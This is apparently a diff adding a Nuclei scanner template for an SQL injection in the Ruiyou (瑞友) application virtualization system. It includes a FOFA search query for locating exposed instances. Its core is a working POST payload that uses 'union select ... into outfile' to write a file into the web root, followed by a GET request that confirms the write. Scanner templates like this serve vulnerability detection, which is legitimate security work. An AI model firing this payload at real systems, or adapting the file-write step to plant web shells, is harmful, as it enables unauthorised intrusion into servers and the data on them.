@@ -1,0 +1,35 @@
+id: ruiyou-xunihua-Console-POST-account-sqli
+
+info:
+  name: ruiyou-xunihua-Console-POST-account-sqli
+  author: White hats
+  severity: high
+  description: 瑞友应用虚拟化系统 Console-POST-account SQL注入漏洞
+  reference:
+    - https://
+  metadata: 
+    fofa-query: '"CASMain.XGI?cmd=GetDirApp" && title=="瑞友应用虚拟化系统"'
+    
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  content: "{{to_lower(rand_base(5))}}"
+
+http:
+  - raw:
+      - "POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde\
+        \ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nUser-Agent:\
+        \ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,\
+        \ like Gecko) Version/12.0.3 Safari/605.1.15\nAccept-Encoding: gzip\n \n{\n\
+        \ \"account\": \"1' union select '{{content}}',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL\
+        \ into outfile '..\\\\\\\\..\\\\\\\\WebRoot\\\\\\\\{{filename}}.xgi'#\",\n \"userPwd\"\
+        : \"1\"\n}"
+      - |
+        GET /{{filename}}.xgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2, '{{content}}')"
